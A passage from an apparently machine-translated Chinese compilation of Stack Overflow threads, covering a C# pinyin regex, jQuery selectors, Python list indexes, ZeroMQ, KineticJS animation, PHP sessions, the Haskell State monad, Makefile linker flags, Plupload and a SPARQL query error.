Regex PinYin = new Regex(@"^(a|ai|an|ang|ao|ba|bai|ban|bang|bao|bei|ben|beng|bi|bian|biao|bie|bin|bing|bo|bu|ca|cai|can|cang|cao|ce|cen|ceng|cha|chai|chan|chang|chao|che|chen|cheng|chi|chong|chou|chu|chua|chuai|chuan|chuang|chui|chun|chuo|ci|cong|cou|cu|cuan|cui|cun|cuo|da|dai|dan|dang|dao|de|den|dei|deng|di|dia|dian|diao|die|ding|diu|dong|dou|du|duan|dui|dun|duo|e|ei|en|eng|er|fa|fan|fang|fei|fen|feng|fo|fou|fu|ga|gai|gan|gang|gao|ge|gei|gen|geng|gong|gou|gu|gua|guai|guan|guang|gui|gun|guo|ha|hai|han|hang|hao|he|hei|hen|heng|hong|hou|hu|hua|huai|huan|huang|hui|hun|huo|ji|jia|jian|jiang|jiao|jie|jin|jing|jiong|jiu|ju|juan|jue|jun|ka|kai|kan|kang|kao|ke|ken|keng|kong|kou|ku|kua|kuai|kuan|kuang|kui|kun|kuo|la|lai|lan|lang|lao|le|lei|leng|li|lia|lian|liang|liao|lie|lin|ling|liu|long|lou|lu|lv|luan|lue|lve|lun|luo|ma|mai|man|mang|mao|me|mei|men|meng|mi|mian|miao|mie|min|ming|miu|mo|mou|mu|na|nai|nan|nang|nao|ne|nei|nen|neng|ni|nian|niang|niao|nie|nin|ning|niu|nong|nou|nu|nv|nuan|nuo|nun|ou|pa|pai|pan|pang|pao|pei|pen|peng|pi|pian|piao|pie|pin|ping|po|pou|pu|qi|qia|qian|qiang|qiao|qie|qin|qing|qiong|qiu|qu|quan|que|qun|ran|rang|rao|re|ren|reng|ri|rong|rou|ru|ruan|rui|run|ruo|sa|sai|san|sang|sao|se|sen|seng|sha|shai|shan|shang|shao|she|shei|shen|sheng|shi|shou|shu|shua|shuai|shuan|shuang|shui|shun|shuo|si|song|sou|su|suan|sui|sun|suo|ta|tai|tan|tang|tao|te|teng|ti|tian|tiao|tie|ting|tong|tou|tu|tuan|tui|tun|tuo|wa|wai|wan|wang|wei|wen|weng|wo|wu|xi|xia|xian|xiang|xiao|xie|xin|xing|xiong|xiu|xu|xuan|xue|xun|ya|yan|yang|yao|ye|yi|yin|ying|yo|yong|you|yu|yuan|yue|yun|za|zai|zan|zang|zao|ze|zei|zen|zeng|zha|zhai|zhan|zhang|zhao|zhe|zhei|zhen|zheng|zhi|zhong|zhou|zhu|zhua|zhuai|zhuan|zhuang|zhui|zhun|zhuo|zi|zong|zou|zu|zuan|zui|zun|zuo)+$"); 
```

用下面的正则表达式方法，效果轻松了，而且很简单，就是对慢（最擅长的方式）长字符串比较，解决内存溢出</p>

（用正则表达式试了一下：最简单，效果也很好，就是有点慢。长字符串上的递归方式太麻烦了，太容易溢出栈了。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T21:42:43.023

*编辑：多亏了LB和millimoose，这大大简化了。*

[正则表达式](http://en.wikipedia.org/wiki/Regular_expression)来拯救！使用[`System.Text.RegularExpressions.Regex`](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regex.aspx)，我们得到：

```
public static bool TestStringFromShortStrings(string checkText, string[] pieces) {
    // Build the expression.  Ultimate result will be
    // of the form "^(xxx|yyy|zzz)+$".
    var expr = "^(" + 
               String.Join("|", pieces.Select(Regex.Escape)) + 
               ")+$";

    // Check whether the supplied string matches the expression.
    return Regex.IsMatch(checkText, expr);
} 
```

这应该能够正确处理具有不同长度的多个重复模式的情况。例如，如果您可能的片段列表包括字符串`"xxx"`和`"xxxx"`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T21:38:48.163

将目标字符串复制到字符串生成器。对于短字符串数组中的每个字符串，从目标中删除所有出现。如果你以零长度字符串结束，则为真，否则为假。

编辑：这种方法是不正确的。请参考评论。保持这个答案仍然在这里，因为它最初看起来相当正确。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T21:42:15.683

您可以将输入字符串的开头与每个短字符串进行比较。一旦你有一个匹配，你拿起其余的字符串并重复。一旦你没有更多的字符串，你就完成了。例如：

```
string[] shortStrings = new string[] { "xxx", "yyy", "zzz" };

bool Test(string input)
{
    if (input.Length == 0)
        return true;

    foreach (string shortStr in shortStrings)
    {
        if (input.StartsWith(shortStr))
        {
            if (Test(input.Substring(shortStr.Length)))
                return true;
        }
    }
    return false;
} 
```

您可以通过删除递归或通过对短字符串进行排序并执行二进制而不是线性搜索来优化它。

* * *

这是一个非递归版本，它使用`Stack`对象来代替。没有机会获得`StackOverflowException`：

```
string[] shortStrings = new string[] { "xxx", "yyy", "zzz" };

bool Test(string input)
{
    Stack<string> stack = new Stack<string>();
    stack.Push(input);

    while (stack.Count > 0)
    {
        string str = stack.Pop();
        if (str.Length == 0)
            return true;
        foreach (string shortStr in shortStrings)
        {
            if (str.StartsWith(shortStr))
                stack.Push(str.Substring(shortStr.Length));
        }
    }
    return false;
} 
```

# jquery - 结合两个 jQuery 对象为高效选择器创建一个自定义上下文

> ID：11786151
> 
> 赞同：0
> 
> 时间：2012-08-02T21:35:56.137
> 
> 标签：jquery

我有一些常见的元素分别在#footer 和#header div 中。为了使选择器更快，我想制作一个自定义 jquery 对象。

#footer 和 #header 的组合。就像是：

```
var someCustomContext = $("#footer") + $("#header");
var betterQuickerSelector = $(".buttonClass", someCustomContext); 
```

这可能吗？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:39:02.490

您可以将选择器与逗号组合：

```
var someCustomContext = $("#footer, #header"); 
```

或者，如果您已经有两个单独的 jQuery 对象，您可以将它们与[`.add()`方法](http://api.jquery.com/add/)结合使用：

```
var footer = $("#footer"),
    header = $("#header"),
    combined = footer.add(header); 
```

`.add()`也适用于选择器：

```
combined = footer.add("#header"); 
```

...以及 doco 页面上描述的其他一些选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:37:08.170

您可以使用逗号分隔任意数量的选择器：

```
var someCustomContext = $('#footer, #header'); 
```

或者对于已经存在的选择器，您可以这样做：

```
var $header = $('#header'),
    $footer = $('#footer'),
    someCustomContext = $header.add($footer); 
```

# python - 如果列表索引存在，做 X

> ID：11786157
> 
> 赞同：172
> 
> 时间：2012-08-02T21:36:20.897
> 
> 标签：python, python-2.7

在我的程序中，用户输入 number `n`，然后输入`n`存储在列表中的字符串数。

我需要编写这样的代码，如果存在某个列表索引，则运行一个函数。

由于我已经嵌套了关于`len(my_list)`.

这是我现在所拥有的简化版本，但它不起作用：

```
n = input ("Define number of actors: ")

count = 0

nams = []

while count < n:
    count = count + 1
    print "Define name for actor ", count, ":"
    name = raw_input ()
    nams.append(name)

if nams[2]: #I am trying to say 'if nams[2] exists, do something depending on len(nams)
    if len(nams) > 3:
        do_something
    if len(nams) > 4
        do_something_else

if nams[3]: #etc. 
```

* * *

## 回答 #1

> 赞同：194
> 
> 时间：2012-08-02T21:46:38.343

`len(n)`使用列表的长度来通知您的决定而不是检查`n[i]`每个可能的长度对您来说是否更有用？

* * *

## 回答 #2

> 赞同：108
> 
> 时间：2012-08-02T21:42:43.500

*我需要编写这样的代码，如果存在某个列表索引，则运行一个函数。*

这是[try 块](http://docs.python.org/tutorial/errors.html#handling-exceptions)的完美用途：

```
ar=[1,2,3]

try:
    t=ar[5]
except IndexError:
    print('sorry, no 5')   

# Note: this only is a valid test in this context 
# with absolute (ie, positive) index
# a relative index is only showing you that a value can be returned
# from that relative index from the end of the list... 
```

但是，根据定义，Python 列表中的所有项目都存在于`0`和之间`len(the_list)-1`（即，如果您知道，则不需要 try 块`0 <= index < len(the_list)`）。

如果你想要 0 和最后一个元素之间的索引，你可以使用[enumerate ：](http://docs.python.org/library/functions.html#enumerate)

```
names=['barney','fred','dino']

for i, name in enumerate(names):
    print(i + ' ' + name)
    if i in (3,4):
        # do your thing with the index 'i' or value 'name' for each item... 
```

* * *

但是，如果您正在寻找一些已定义的“索引”，我认为您问的是错误的问题。也许您应该考虑使用[映射](https://docs.python.org/3/library/stdtypes.html#mapping-types-dict)容器（例如 dict）与[序列](https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range)容器（例如列表）。你可以像这样重写你的代码：

```
def do_something(name):
    print('some thing 1 done with ' + name)

def do_something_else(name):
    print('something 2 done with ' + name)        

def default(name):
    print('nothing done with ' + name)     

something_to_do={  
    3: do_something,        
    4: do_something_else
    }        

n = input ("Define number of actors: ")
count = 0
names = []

for count in range(n):
    print("Define name for actor {}:".format(count+1))
    name = raw_input ()
    names.append(name)

for name in names:
    try:
        something_to_do[len(name)](name)
    except KeyError:
        default(name) 
```

像这样运行：

```
Define number of actors: 3
Define name for actor 1: bob
Define name for actor 2: tony
Define name for actor 3: alice
some thing 1 done with bob
something 2 done with tony
nothing done with alice 
```

您也可以使用[.get](https://docs.python.org/2/library/stdtypes.html#dict.get)方法而不是 try/except 更短的版本：

```
>>> something_to_do.get(3, default)('bob')
some thing 1 done with bob
>>> something_to_do.get(22, default)('alice')
nothing done with alice 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-08-02T21:42:45.003

`len(nams)``n`在您的代码中应该等于。所有索引`0 <= i < n`“存在”。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2018-07-05T16:10:19.133

只需使用以下代码即可完成：

```
if index < len(my_list):
    print(index, 'exists in the list')
else:
    print(index, "doesn't exist in the list") 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2017-05-31T10:34:18.583

使用列表的长度将是检查索引是否存在的最快解决方案：

```
def index_exists(ls, i):
    return (0 <= i < len(ls)) or (-len(ls) <= i < 0) 
```

这也测试负索引，以及大多数具有长度的序列类型（Like`ranges`和s）。`str`

如果您之后无论如何都需要访问该索引处的项目，[请求原谅比许可更容易](https://docs.python.org/3/glossary.html#term-eafp)，而且它也更快，更 Pythonic。使用`try: except:`.

```
try:
    item = ls[i]
    # Do something with item
except IndexError:
    # Do something without the item 
```

这将与：

```
if index_exists(ls, i):
    item = ls[i]
    # Do something with item
else:
    # Do something without the item 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2012-08-02T22:47:12.173

> 我需要编写这样的代码，如果存在某个列表索引，则运行一个函数。

您已经知道如何对此进行测试，并且实际上**已经在您的代码中执行了此类测试**。

长度列表的有效索引`n`是`0`通过`n-1`包容性。

`i` **因此，当且仅当**列表的长度至少为 时，列表才具有索引`i + 1`。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-08-02T21:45:36.380

如果要迭代插入的演员数据：

```
for i in range(n):
    if len(nams[i]) > 3:
        do_something
    if len(nams[i]) > 4:
        do_something_else 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-02-02T22:38:58.170

好的，所以我认为这实际上是可能的（为了争论）：

```
>>> your_list = [5,6,7]
>>> 2 in zip(*enumerate(your_list))[0]
True
>>> 3 in zip(*enumerate(your_list))[0]
False 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-01-03T18:16:16.093

你可以试试这样的

```
list = ["a", "b", "C", "d", "e", "f", "r"]

for i in range(0, len(list), 2):
    print list[i]
    if len(list) % 2 == 1 and  i == len(list)-1:
        break
    print list[i+1]; 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-03-02T13:13:37.587

单线：

```
do_X() if len(your_list) > your_index else do_something_else() 
```

完整示例：

```
In [10]: def do_X(): 
    ...:     print(1) 
    ...:                                                                                                                                                                                                                                      

In [11]: def do_something_else(): 
    ...:     print(2) 
    ...:                                                                                                                                                                                                                                      

In [12]: your_index = 2                                                                                                                                                                                                                       

In [13]: your_list = [1,2,3]                                                                                                                                                                                                                  

In [14]: do_X() if len(your_list) > your_index else do_something_else()                                                                                                                                                                      
1 
```

仅供参考。恕我直言，`try ... except IndexError`是更好的解决方案。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2021-07-03T17:04:23.977

这是我今天想解决这个问题的一种简单但计算效率低的方法：

只需在 my_list 中创建一个可用索引列表：

```
indices = [index for index, _val in enumerate(my_list)] 
```

然后您可以在每个代码块之前进行测试：

```
if 1 in indices:
    "do something"
if 2 in indices:
    "do something more" 
```

但任何阅读本文的人都应该从以下位置获得正确答案：@user6039980

* * *

## 回答 #12

> 赞同：-4
> 
> 时间：2017-05-07T11:20:16.713

不要在括号前面留出任何空间。

例子：

```
n = input ()
         ^ 
```

提示：您应该在代码上方和/或下方添加注释。不在您的代码后面。

* * *

祝你今天过得愉快。

# zeromq - ZMQ REP，知道谁发送请求

> ID：11786160
> 
> 赞同：11
> 
> 时间：2012-08-02T21:36:41.883
> 
> 标签：zeromq, pyzmq

我目前正在将 zmq 与 python 一起使用。服务器正在使用 REP 套接字。

我有办法在接收消息时知道是谁发送的吗？如果收到 2 条消息，我只需要知道它们是否来自同一个用户，因此例如 uid 就足够了。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-30T10:08:44.910

看起来您想在服务器端实现异步请求处理：您让服务器接受请求，异步处理它们，并在响应数据可用于每个请求时将响应发送回客户端。当然现在：在处理完请求后，您怎么知道将请求发回给哪个客户端？

`recv() -> send(), recv() -> send()`使用简单的 REP 套接字，ZMQ 通过强制执行顺序确保您不会遇到此类问题。换句话说，在你`recv()`对一个 REP 套接字执行 a 之后，你**必须**再次从它执行 a `send()`before 。`recv()`响应将被发送回您收到消息的客户端，并且客户端的地址毫无疑问，因为它一次只有一个客户端。

但是，当您想要并行化请求处理时，这并没有真正的帮助，不是吗？在很多情况下，REP 的行为过于严格，而这正是 Multipart 消息和 ROUTER（或 XREP）套接字的用途。XREP 打破了`recv() -> send()`REP 的锁步，但这会导致我们之前看到的问题 - 如果连接了多个客户端，您如何知道将回复发送回哪个客户端？为了完成这项工作，ZMQ 中的 XREP 在消息的前面添加了一个消息部分，例如信封，其中包括它`recv()`发出请求的连接的标识。

ZMQ 指南中有一整章介绍了[高级请求-回复模式](http://zguide2.zeromq.org/py:all#Chapter-Three-Advanced-Request-Reply-Patterns)。您还可以在此处找到处理异步请求的示例，并[在此处](http://zguide.zeromq.org/py:asyncsrv)找到有关 ZMQ 连接处理的简短[说明](https://stackoverflow.com/questions/13124359/does-pyzmq-handle-creating-threads-for-each-new-client-connection)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-03T11:41:54.520

阅读[http://zguide.zeromq.org/page%3aall#Transient-vs-Durable-Sockets](http://zguide.zeromq.org/page%3aall#Transient-vs-Durable-Sockets)，您只能获取您正在使用的套接字的身份......而不是您连接的任何对等方的套接字到。

话虽这么说，只需将发件人信息构建到消息中即可。这应该是微不足道的（使用 UUID 或每个客户端的特定名称）。

# kineticjs - 当我离开标签时，画布、KineticJs、方块弹跳离开边缘

> ID：11786161
> 
> 赞同：0
> 
> 时间：2012-08-02T21:36:44.003
> 
> 标签：kineticjs

伙计们，我对 canvas 和 kineticjs 相对较新，大约 1 个月，我的英语很差，对此我深表歉意。

我的问题：方块在画布边缘外弹跳。

当我更改选项卡或最小化资源管理器时，方块会离开边缘。图片示例：[http ://clip2net.com/s/2aLYf](http://clip2net.com/s/2aLYf)

我将选项卡更改为 5 秒，然后方块忽略边缘，如果我返回动画，方块开始返回限制内。因此，当我不观看动画或动画选项卡未激活时，边缘将被忽略。

当我再次观看标签时，方块会返回。

我的代码已关闭

```
 function init_squares(){
var stage = new Kinetic.Stage({
  container: "square_animation",
  width: 150,
  height: 150
});

var stage_width = 150;
var stage_height = 150;

var layer = new Kinetic.Layer();
var num_squares = 12;

var squares = [];

    //creates the squares
for(var i=0; i < num_squares; i++){
            var this_width = get_width();
    squares[i] = new Kinetic.Rect({
                  x: stage_width / 2 ,
                  y: stage_height / 2,
                  width: this_width,
                  height: this_width,
              fill: get_color(),
          vy: get_random_speed(),   //custom values for the use of velocity
          vx: get_random_speed(),   //custom values for the use of velocity
           alpha: .7
    });
}

initialize_squares(); //initialize the squares
    function initialize_squares(){
    var n = squares.length;
    for(var i=0; i < n; i++){
        layer.add(squares[i]);
    }
    stage.add(layer);
}

//animation frame   
stage.onFrame(function(frame) {

    var n = squares.length;
    for(var i=0; i < n; i++){
        var attr = squares[i].getAttrs();
        var new_x =  squares[i].getX() + (attr.vx * frame.timeDiff / 1000);
        var new_y =  squares[i].getY() + (attr.vy * frame.timeDiff / 1000);
        var x = squares[i].getX();
        var y = squares[i].getY();

        //check right border
        if((x + attr.width) > stage_width){
            if(attr.vx > 0)
                attr.vx *= -1;
        }
        //check left border
        if(x <= 0){
            if(attr.vx < 0)
                attr.vx *= -1;
        }

        //check top border
        if(y <= 0){
            if(attr.vy < 0)
                attr.vy *= -1;
        }

        //check bottom border
        if((y + attr.width) > stage_height){
            if(attr.vy > 0)
                attr.vy *= -1;
        }

        squares[i].setY( new_y);
        squares[i].setX( new_x);
        squares[i].setAttrs({vx: attr.vx, vy: attr.vy});
    }
    layer.draw();
});
stage.start();  

function get_random_speed(){
    if( (Math.floor(Math.random() * 2) + 1) % 2 == 0)
        return (Math.floor(Math.random() * 30) + 40) * -1;
    else
        return Math.floor(Math.random() * 30) + 40;
}

function get_color(){
    var colors = ['#c8c8c8','#b7b7b7','#ababab','#999999','#d2d2d2','#818181','#8f8f8f'];
    var n = colors.length;
    return colors[Math.floor(Math.random() * n)];
}

function get_width(){
    var widths = [20,22,24,28,26];
    var n = widths.length;
    return widths[Math.floor(Math.random() * n)];
}
    } 
```

这是我正在工作的网站，方块在菜单的下方。 [http://uniformestoro.com/](http://uniformestoro.com/)

非常感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T10:41:21.947

快速查看您的代码后，我认为问题在于计算位置，然后检查每一帧上的碰撞。因此，当您不查看选项卡时，不会渲染任何帧，因此，当您再次查看它时，您的对象将在框外绘制（因为 frame.timeDiff 同时变得非常大，因此它们移动很多）然后开始如果它们刚刚与边缘碰撞，它们会移动它们的方向。我建议你首先计算他们需要多少时间才能击中边缘，如果他们击中了边缘，然后将剩余的时间用于远离边缘的运动。（这也解决了当您出现极端 fps 下降时的问题，这会导致代码以相同的方式表现不同！）

# javascript - Javascript相互干扰

> ID：11786162
> 
> 赞同：2
> 
> 时间：2012-08-02T21:36:50.557
> 
> 标签：javascript, ajax, jquery

由于我对 Javascript 和 Jquery 知之甚少，我希望能够在这里得到答案。

这是我`<head></head>`的文档中的代码。

```
 <script src="js/jquery.js" type="text/javascript"></script>
    <script src="js/functions.js" type="text/javascript"></script>
    <script type="text/javascript" src="js/jscolor/jscolor.js"></script>
<script type="text/javascript">

var current_shouts = 0;
            function $(eleid) {
                return document.getElementById(eleid);
            }
            function urlencode(u) {
                u = u.toString();
                var matches = u.match(/[\x90-\xFF]/g);
                if (matches) {
                    for (var mid = 0; mid < matches.length; mid++) {
                        var char_code = matches[mid].charCodeAt(0);
                        u = u.replace(matches[mid], '%u00' + (char_code & 0xFF).toString(16).toUpperCase());
                    }
                }
                return escape(u).replace(/\+/g, "%2B");
            }
            function shouts() {
                clearTimeout(getshout);
                var xmlHttp = (window.XMLHttpRequest) ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                xmlHttp.open("GET", "../shoutbox/shouts.php?i=" + Math.random());
                xmlHttp.onreadystatechange = function() {
                    if (this.readyState == 4) {
                        if (parseInt(this.responseText) > current_shouts) {
                            getshouts();
                            current_shouts = parseInt(this.responseText);
                        }
                        getshout = setTimeout("shouts()", 1000);
                    }
                }
                xmlHttp.send(null);
            }
            function getshouts() {
                var xmlHttp = (window.XMLHttpRequest) ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                xmlHttp.open("GET", "../shoutbox/getshouts.php?i=" + Math.random());
                xmlHttp.onreadystatechange = function() {
                    if (this.readyState == 4) $("shoutbox").innerHTML = this.responseText;
$("shoutbox").scrollTop = $("shoutbox").scrollHeight;
                }
                xmlHttp.send(null);
            }
            function push_shout() {
                shout();
                return false;
            }
            function shout() {
                var xmlHttp = (window.XMLHttpRequest) ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                xmlHttp.open("POST", "../shoutbox/shout.php");
                var data = "user=" + urlencode($("user").value) + "&" + "shout=" + urlencode($("shout").value);
                xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xmlHttp.setRequestHeader("Content-length", data.length);
                xmlHttp.onreadystatechange = function() {
                    if (this.readyState == 4) {
                        if (!this.responseText) $("shout").value = "";
                        else {
                            $("console").innerHTML = this.responseText;
                            setTimeout("$('console').innerHTML = ''", 5000);
                        }
                        getshouts();
                    }
                }
                xmlHttp.send(data);
                return true;
            }
            var getshout = setTimeout("shouts()", 1000);
</script> 
```

似乎当我将键入的代码放在所有内容之上时，它不起作用，但其他代码则可以，如果代码位于上面显示的位置，它可以工作，但上面的脚本不再工作。

我试过`$.noConflict();`了，但似乎什么也没做，所以我不确定我要在这里做什么。

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:39:37.367

尝试类似：

```
$j = jQuery.noConflict(); 
```

然后您可以`$j`在需要时使用来引用 jQuery 对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-20T22:30:26.403

我遇到了 jQuery 插件以某种方式发生冲突的问题。我将两者都加载到了 html 文档的头部，在连续分开的脚本标签区域之间。然后我用：

`window.onload = function() {function01(); function02();};`

以有序的方式分别加载每个函数。

这次它对我有用。

# php - PHP会话从android WebService过期

> ID：11786163
> 
> 赞同：1
> 
> 时间：2012-08-02T21:37:05.133
> 
> 标签：php, android, web-services, session-variables

我正在编写一个有时使用 php 脚本的 android 应用程序，现在我正在尝试在我正在使用的 php 脚本中使用一些会话 ID。因此，当用户从应用程序在 Web 服务上登录（登录/密码）时，会在 Web 服务/PHP 服务器上创建一个 sessionID。

我想知道如果会话在服务器上一段时间后过期并且android设备会尝试发出请求（因为它不知道会话是否仍在工作）会发生什么？如果 android httpclient 仍在 android 应用程序中，会话实际上可以被销毁吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:40:03.470

过期会话仅标记为垃圾回收的候选对象。

垃圾收集器在每个请求之前以一定的概率被调用。

因此，即使会话到期时间已经到来 - 这并不意味着会话将立即被销毁。如果在到期时间到达之后但在它被删除之前访问它 - 到期时间计数器从头开始。

# haskell - haskell - 状态单子函数得到？

> ID：11786165
> 
> 赞同：4
> 
> 时间：2012-08-02T21:37:08.057
> 
> 标签：haskell, monads, state-monad

根据State Monad的get函数提出一个问题：

如果我跑

> 运行状态得到 1

我得到了结果

> (1,1)

这对我来说没问题，因为 get 函数将结果值设置为状态，在这种情况下，状态为 1。因此，(1,1) 是结果。好的。

但如果我跑

> runState (do{(a,b) <- get; return a}) (False, 0)

我得到了结果

> （假，（假，0））

而这我不明白。

get 函数将结果值设置为状态并保持状态不变。所以我期望的是这样的

> （（假，0），（假，0））

这个也一样

> runState (do{(a,b) <- get; return b}) (False, 0)

结果是

> (0,(假,0))

如上所述，我再次不明白这一点。

所以，如果你能为我解释这个奇怪的结果，那就太好了。;)

提前致谢

此致，

吉米

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-02T22:06:23.657

这是因为您在 之后做了一些事情`get`，即您`return`是组件之一。忽略新类型包装，

```
return x = \s -> (x,s) 
```

所以

```
do { (a,b) <- get; return a }   ===   get >>= \(a,b) -> return a 
```

扩展到

```
(\s -> (s,s)) >>= \(a,b) -> (\t -> (a,t)) 
```

并且随着它的定义`(>>=)`变成

```
\s1 -> let (r,s2) = (\s -> (s,s)) s1
       in (\(a,b) -> (\t -> (a,t))) r s2 
```

当你以初始状态运行它时`(False,0)`，它会展开

```
let (r,s2) = (\s -> (s,s)) (False,0)
~> let (r,s2) = ((False,0),(False,0))
in (\(a,b) -> (\t -> (a,t))) r s2
~> in (\(a,b) -> (\t -> (a,t))) (False,0) (False,0)
~> in (\t -> (False,t)) (False,0)    -- match (a,b) with (False,0)
~> in (False, (False,0)) 
```

其他情况与此`return b`类似。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-02T23:27:09.980

丹尼尔的回答当然是正确和完整的，所以让我尝试从不同的角度来回答它，并讨论可能的误解。

您预计`((False,0),(False,0))`会被退回

```
runState (do{(a,b) <- get; return a}) (False, 0) 
```

现在要真正得到这个预期的结果，你必须写，例如，

```
runState (do{(a,b) <- get; return (a,b)}) (False, 0) 
```

（这在道德上等同于`runState get (False, 0)`.

也许您感到困惑`get`，并且`runState`；后者返回一个元组，其中一个组件是计算的结果，另一个是最终状态。事实上，你会把那个元组拆开来只获得（最终）状态。`get`然而，它有一个返回值，它只是（当前）状态，仅此而已——不需要解元组。如果您确实将元组拆开并仅返回`a`（或`b`），那么正如您所观察到的那样，这会相应地显示为完整有状态计算的结果。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-02T07:23:37.827

让我们尝试第三个答案：

确实如此`get = \s -> (s,s)`，但是（在 State 的情况下）do-notation 内的箭头只输出**value**。这都是因为`bind`这个**单子**的定义。

所以，你没有得到整对`(s,s)`。你得到的只是第一个`s`。

您提供了初始状态 = `(False,0)`; `<-`箭头为您提供复制的值并将其`(False,0)`绑定到`(a,b)`.

然后围绕 value 构建一个 state monad `a = False`。这个 monad 将返回`(a,s)`，那就是`(False,(False,0))`.

初始状态在运行期间没有改变，因为既没有`get`也`return`没有修改它。

# makefile - Makefile -L 命令

> ID：11786166
> 
> 赞同：0
> 
> 时间：2012-08-02T21:37:11.257
> 
> 标签：makefile, shared-libraries

如果我在 make 文件中有这一行：\

```
libpqxx_Libs = -L/share/home/cb -lpqxx-2.6.9 -lpq 
```

这是否表明编译器使用 lpqxx-2.6.9.so 共享对象文件，或者这是否表明编译器使用文件夹 lpqxx-2.6.9 中的所有 .so？或者这完全是别的什么？

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T21:43:26.043

`-L`在这种情况下是链接器的一个参数*，*它将指定的目录添加到链接器将*搜索*必要库的目录列表中，例如您使用指定的库`-l`。

它不是一个 makefile 命令，尽管它通常出现在 C 项目的 makefile 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T02:55:46.183

`-L`实际上不是`makefile`命令（正如您在问题标题中所述）。

在这一行中实际发生的是对变量的赋值`libpqxx_Libs`——不多也不少。您必须通过或搜索`makefile`使用该变量的位置。这很可能作为链接命令或包含链接的编译命令中的参数。`$(libpqxx_Libs)``${libpqxx_Libs}`

`-L`在这种情况下，和的含义`-l`可以在例如[gcc 手册页](http://www-hep2.fzu.cz/computing/htmldoc/gcc_hp.html)中找到，其中指出

```
-llibrary
   Use the library named library when linking.

   The linker searches a standard list of directories  for  the  li-
   brary, which is actually a file named `liblibrary.a'.  The linker
   then uses this file as if it  had  been  specified  precisely  by
   name.

   The directories searched include several standard  system  direc-
   tories plus any that you specify with `-L'. 
```

# javascript - 是否可以使用 Plupload 调整文件的大小以获得更多大小？

> ID：11786167
> 
> 赞同：1
> 
> 时间：2012-08-02T21:37:14.763
> 
> 标签：javascript, plupload

我需要使用`plupload`. 例如，小、中、大图片。

只用javascript可以做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T10:43:12.370

**不，JavaScript 只是脚本语言。**

*它没有库来帮助操作图像、复制文件、发送电子邮件等。我们可以调用服务器端实用程序或注入代理，但它是专门为 DOM 操作而发明的*

在问题中，OP 专门研究了使用 JavaScript 来操作图像并使用 plupload 上传它。这是不可能的，因为 JS 本身无法做到这一点。

plupload 的默认插件依赖于silverlight、flash 或gears，这些平台分别可以在本地处理图像，然后使用调整大小的文件调用上传——这将上传到服务器。

当时可能是 OP，我想避免使用 flash、silverlight 等以保持跨浏览器兼容性并在旧浏览器上使用。

因此，一个好的解决方案是将文件上传到服务器并使用 .NET/PHP 工具按照需要的方式操作图像。在保留原始图像的同时。它运行良好，您可以将图像大小限制为 5mb；这可能会导致一些基本的用户体验，但这是一个很好的权衡。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-21T11:23:27.280

您可以在上传图像时插入一个函数来调整图像大小。

```
if (!$chunks || $chunk == $chunks - 1) {
// Strip the temp .part suffix off 
rename("{$filePath}.part", $filePath);
resize_image($filePath);
} 
```

# regex - 带过滤的 SPARQL 查询

> ID：11786169
> 
> 赞同：0
> 
> 时间：2012-08-02T21:37:26.717
> 
> 标签：regex, sparql, dotnetrdf

我喜欢列出所有以某个字母开头的药物来填充自动填充文本框。这里是代码

```
public string[] GetCompletionList(string prefixText)
{
    string rdfDat = AppDomain.CurrentDomain.BaseDirectory + "DrugRDF.rdf";

        List<string> list = new List<string>();
        TripleStore store = new TripleStore();
        Graph rdf = new Graph();
        FileLoader.Load(rdf, rdfDat, new RdfXmlParser());
        store.Add(rdf);
        string tmp = "^" + prefixText;
        string sparqlQuery = "PREFIX  mojLek: <http://www.example.org/mojLek#>"
            + "PREFIX xsd: <http://www.w3.org/2001/XMLSchema#>"
            + "PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>"
            + "PREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>"
            + "SELECT  ?x"
            + "WHERE {?h mojLek:ime ?x ."
            + "FILTER regex(str(?x),"+tmp+")            }";

        SparqlQueryParser sparqlParser = new SparqlQueryParser();
        SparqlQuery query = sparqlParser.ParseFromString(sparqlQuery);
        Object results = store.ExecuteQuery(query);
        if (results is SparqlResultSet)
        {
            SparqlResultSet r = results as SparqlResultSet;

            foreach (SparqlResult res in r)
            {

                list.Add(res["x"].ToString().ToLower());
            }
        }

        return list.ToArray();

} 
```

但是，如果我用例如 A 尝试它，已经有以 AI 开头的情侣得到了这个错误

```
VDS.RDF.Parsing.RdfParseException: [Line 1 Column 263] The value &#39;A&#39; is not valid as a QName

